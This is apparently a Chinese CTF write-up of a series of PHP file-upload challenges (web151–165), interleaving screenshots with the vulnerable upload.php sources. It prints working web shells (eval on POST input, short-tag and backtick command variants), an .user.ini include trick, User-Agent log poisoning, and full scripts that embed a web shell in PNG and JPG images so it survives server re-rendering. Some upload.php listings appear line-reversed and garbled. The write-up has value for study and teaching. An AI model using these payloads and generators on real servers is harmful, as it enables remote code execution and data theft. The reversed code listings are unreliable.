        <content type="html"><![CDATA[<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><h2 id="js验证"><a href="#js验证" class="headerlink" title="js验证"></a>js验证</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262148095.png" alt="image-20220326214849015"></p><p>抓包直接绕过</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157563.png" alt="image-20220326215712504"></p><p>这只能上传png</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157883.png" alt="image-20220326215724837"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157152.png" alt="image-20220326215748109"></p><h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><h2 id="content-type验证"><a href="#content-type验证" class="headerlink" title="content-type验证"></a>content-type验证</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301313985.png" alt="image-20220330131322909"></p><pre><code>&lt;?php @eval($_POST[&quot;zf&quot;]);?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301323253.png" alt="image-20220330132324163"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301323397.png" alt="image-20220330132331339"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301325953.png" alt="image-20220330132523896"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-24 21:20:33 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);            $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);        &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><h2 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h2><pre><code>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</code></pre><p>具体的配置可以看<a href="https://www.php.net/manual/en/ini.list.php">该链接</a>,也就是里面除了PHP_INI_SYSTEM模式的配置之外都可以在.user.ini进行重写.那么我们就去找我们需要用到的配置,发现auto_append_file和auto_prepend_file,一个相当于在每个php文件尾加上include(“xxx”),一个相当于在文件头加上include(“xxx”)其中xxx就是auto_append_file的值</p><p>为了利用auto_append_file,我们首先上传一个带木马的图片,接着上传.user.ini内容为auto_append_file&#x3D;”xxx”xxx为我们上传的图片文件名.这样就在每一个php文件上包含了我们的木马文件.</p><p>但是这种方式是有前提的,是必须要在.user.ini目录下面有一个.PHP的文件才能进行包含</p><pre><code>GIF89aauto_prepend_file=zf.png</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154036831.png" alt="image-20220409154036831"></p><p>可见这里是存在的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409153852085.png" alt="image-20220409153852085"></p><p>接着上传一个zf.png文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154548671.png" alt="image-20220409154548671"></p><p>连接upload&#x2F;index.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154653789.png" alt="image-20220409154653789"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154721284.png" alt="image-20220409154721284"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-24 21:46:57 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if($ext_suffix!=&#39;php&#39;)&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><pre><code>&lt;?@eval($_POST[&#39;zf&#39;]);?&gt;    开启配置参数short_open_tags=on&lt;?=@eval($_POST[&#39;zf&#39;]);?&gt;    等价于&lt;?php echo (表达式)?&gt;    不需要开启参数设置&lt;%@eval($_POST[&#39;zf&#39;]);%&gt;    开启配置参数asp_tags=on,7.0以下可以使用&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;zf&#39;]);&lt;/script&gt;    不需要修改参数开关，但是只能在7.0以下可</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160142938.png" alt="image-20220409160142938"></p><p>只有这个可行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160318682.png" alt="image-20220409160318682"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-26 15:30:10 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if($ext_suffix!=&#39;php&#39;)&#123;                $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);                if(strrpos($content, &quot;php&quot;)==FALSE)&#123;                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                &#125;else&#123;                    $ret = array(&quot;code&quot;=&gt;3,&quot;msg&quot;=&gt;&quot;文件内容不合规&quot;);                &#125;                            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160958426.png" alt="image-20220409160958426"></p><pre><code>&lt;?@eval($_POST[&#39;zf&#39;]);?&gt;    开启配置参数short_open_tags=on&lt;?=@eval($_POST[&#39;zf&#39;]);?&gt;    等价于&lt;?php echo (表达式)?&gt;    不需要开启参数设置</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162026191.png" alt="image-20220409162026191"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-26 15:49:51 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if($ext_suffix!=&#39;php&#39;)&#123;                $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);                if(stripos($content, &quot;php&quot;)===FALSE)&#123;                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                &#125;else&#123;                    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);                &#125;                            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162822037.png" alt="image-20220409162822037"></p><pre><code>&lt;?@eval($_POST&#123;&#39;zf&#39;&#125;);?&gt;    开启配置参数short_open_tags=on&lt;?=@eval($_POST&#123;&#39;zf&#39;&#125;);?&gt;    等价于&lt;?php echo (表达式)?&gt;    不需要开启参数设置</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162937037.png" alt="image-20220409162937037"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-26 15:49:51 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if($ext_suffix!=&#39;php&#39;)&#123;                $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);                if(stripos($content, &quot;php&quot;)===FALSE &amp;&amp; stripos($content,&quot;[&quot;)===FALSE)&#123;                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                &#125;else&#123;                    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);                &#125;                            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><h2 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤;"></a>过滤;</h2><pre><code>&lt;?(system(&quot;tac ../fl*&quot;))?&gt;    &lt;?=system(&#39;tac ../f*&#39;)?&gt;    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409163553366.png" alt="image-20220409163553366"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164110708.png" alt="image-20220409164110708"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164115998.png" alt="image-20220409164115998"></p><pre><code class="php">echo json_encode($ret);&#125;    return !preg_match(&#39;/php|\&#123;|\[|\;/i&#39;, $str);function check($str)&#123;&#125;    &#125;                &#125;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;else&#123;                        &#125;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;else&#123;                                &#125;                    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);                &#125;else&#123;                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                if(stripos($content, &quot;php&quot;)===FALSE &amp;&amp; check($content))&#123;                $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);            if($ext_suffix!=&#39;php&#39;)&#123;            $ext_suffix = $arr[&#39;extension&#39;];            $arr = pathinfo($filename);        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;    &#125;else&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    if($filesize&gt;1024)&#123;    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];&#123;else&#125;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#123;if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</code></pre><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164314070.png" alt="image-20220409164314070"></p><pre><code>&lt;?(system(&quot;tac ../fl*&quot;))?&gt;    &lt;?=system(&#39;tac ../f*&#39;)?&gt;    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164404138.png" alt="image-20220409164404138"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164408362.png" alt="image-20220409164408362"></p><p>upload.php</p><pre><code class="php">echo json_encode($ret);&#125;    return !preg_match(&#39;/php|\&#123;|\[|\;|log/i&#39;, $str);function check($str)&#123;&#125;    &#125;                &#125;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;else&#123;                        &#125;                $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);            &#125;else&#123;                                &#125;                    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);                &#125;else&#123;                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                if(stripos($content, &quot;php&quot;)===FALSE &amp;&amp; check($content))&#123;                $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);            if($ext_suffix!=&#39;php&#39;)&#123;            $ext_suffix = $arr[&#39;extension&#39;];            $arr = pathinfo($filename);        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;    &#125;else&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    if($filesize&gt;1024)&#123;    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];&#123;else&#125;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#123;if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)error_reporting(0);*/ link: https://ctfer.com email: h1xa@ctfer.com Last Modified time: 2020-10-26 15:49:51 Last Modified by:   h1xa Date:   2020-10-24 19:34:52 Author: h1xa# -*- coding: utf-8 -*-/*&lt;?php&lt;?phpnothing here</code></pre><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号;"></a>过滤括号;</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165109925.png" alt="image-20220409165109925"></p><pre><code>&lt;?=`tac ../fl*`?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165019031.png" alt="image-20220409165019031"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165041739.png" alt="image-20220409165041739"></p><h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165330693.png" alt="image-20220409165330693"></p><p>在ua上写入</p><pre><code>&lt;?=`tac ../fl*`?&gt;</code></pre><p>图片内容如下</p><pre><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165529131.png" alt="image-20220409165529131"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409174817796.png" alt="image-20220409174817796"></p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h2 id="检查文件头前面加上"><a href="#检查文件头前面加上" class="headerlink" title="检查文件头前面加上"></a>检查文件头前面加上</h2><pre><code>GIF89a</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181404771.png" alt="image-20220409181404771"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181626857.png" alt="image-20220409181626857"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181633251.png" alt="image-20220409181633251"></p><h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><h2 id="png图片二次渲染绕过"><a href="#png图片二次渲染绕过" class="headerlink" title="png图片二次渲染绕过"></a>png图片二次渲染绕过</h2><pre><code class="php">&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,    0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;    $r = $p[$y];    $g = $p[$y+1];    $b = $p[$y+2];    $color = imagecolorallocate($img, $r, $g, $b);    imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#39;./zf.png&#39;);  //要修改的图片的路径/* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; */?&gt;</code></pre><p>运行完上传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409182912857.png" alt="image-20220409182912857"></p><p>查看一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409182928106.png" alt="image-20220409182928106"></p><p>curl + s保存 打开查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409183005108.png" alt="image-20220409183005108"></p><h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><h2 id="jpg图片二次渲染绕过"><a href="#jpg图片二次渲染绕过" class="headerlink" title="jpg图片二次渲染绕过"></a>jpg图片二次渲染绕过</h2><p>PHP1.php</p><pre><code class="php">&lt;?php$miniPayload = &#39;&lt;?php @eval($_POST[&quot;zf&quot;]);?&gt;&#39;;if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;    die(&#39;php-gd is not installed&#39;);&#125;if(!isset($argv[1])) &#123;    die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);&#125;set_error_handler(&quot;custom_error_handler&quot;);for($pad = 0; $pad &lt; 1024; $pad++) &#123;    $nullbytePayloadSize = $pad;    $dis = new DataInputStream($argv[1]);    $outStream = file_get_contents($argv[1]);    $extraBytes = 0;    $correctImage = TRUE;    if($dis-&gt;readShort() != 0xFFD8) &#123;        die(&#39;Incorrect SOI marker&#39;);    &#125;    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;        $marker = $dis-&gt;readByte();        $size = $dis-&gt;readShort() - 2;        $dis-&gt;skip($size);        if($marker === 0xDA) &#123;            $startPos = $dis-&gt;seek();            $outStreamTmp =                substr($outStream, 0, $startPos) .                $miniPayload .                str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                substr($outStream, $startPos);            checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);            if($extraBytes !== 0) &#123;                while((!$dis-&gt;eof())) &#123;                    if($dis-&gt;readByte() === 0xFF) &#123;                        if($dis-&gt;readByte !== 0x00) &#123;                            break;                        &#125;                    &#125;                &#125;                $stopPos = $dis-&gt;seek() - 2;                $imageStreamSize = $stopPos - $startPos;                $outStream =                    substr($outStream, 0, $startPos) .                    $miniPayload .                    substr(                        str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                        substr($outStream, $startPos, $imageStreamSize),                        0,                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                    substr($outStream, $stopPos);            &#125; elseif($correctImage) &#123;                $outStream = $outStreamTmp;            &#125; else &#123;                break;            &#125;            if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;                die(&#39;Success!&#39;);            &#125; else &#123;                break;            &#125;        &#125;    &#125;&#125;unlink(&#39;payload_&#39;.$argv[1]);die(&#39;Something\&#39;s wrong&#39;);function checkImage($filename, $data, $unlink = FALSE) &#123;    global $correctImage;    file_put_contents($filename, $data);    $correctImage = TRUE;    imagecreatefromjpeg($filename);    if($unlink)        unlink($filename);    return $correctImage;&#125;function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;    global $extraBytes, $correctImage;    $correctImage = FALSE;    if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;        if(isset($m[1])) &#123;            $extraBytes = (int)$m[1];        &#125;    &#125;&#125;class DataInputStream &#123;    private $binData;    private $order;    private $size;    public function __construct($filename, $order = false, $fromString = false) &#123;        $this-&gt;binData = &#39;&#39;;        $this-&gt;order = $order;        if(!$fromString) &#123;            if(!file_exists($filename) || !is_file($filename))                die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);            $this-&gt;binData = file_get_contents($filename);        &#125; else &#123;            $this-&gt;binData = $filename;        &#125;        $this-&gt;size = strlen($this-&gt;binData);    &#125;    public function seek() &#123;        return ($this-&gt;size - strlen($this-&gt;binData));    &#125;    public function skip($skip) &#123;        $this-&gt;binData = substr($this-&gt;binData, $skip);    &#125;    public function readByte() &#123;        if($this-&gt;eof()) &#123;            die(&#39;End Of File&#39;);        &#125;        $byte = substr($this-&gt;binData, 0, 1);        $this-&gt;binData = substr($this-&gt;binData, 1);        return ord($byte);    &#125;    public function readShort() &#123;        if(strlen($this-&gt;binData) &lt; 2) &#123;            die(&#39;End Of File&#39;);        &#125;        $short = substr($this-&gt;binData, 0, 2);        $this-&gt;binData = substr($this-&gt;binData, 2);        if($this-&gt;order) &#123;            $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);        &#125; else &#123;            $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);        &#125;        return $short;    &#125;    public function eof() &#123;        return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);    &#125;&#125;?&gt;</code></pre><p>zf.jpg</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185129128.png" alt="image-20220409185129128"></p><p>直接上传</p><p>将图片保存到本地</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185322599.png" alt="image-20220409185322599"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185354692.png" alt="image-20220409185354692"></p><p>运行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185416928.png" alt="image-20220409185416928"></p><p>产生</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185438731.png" alt="image-20220409185438731"></p><p>上传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185502593.png" alt="image-20220409185502593"></p><p>连接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185520738.png" alt="image-20220409185520738"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-27 17:14:10 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = 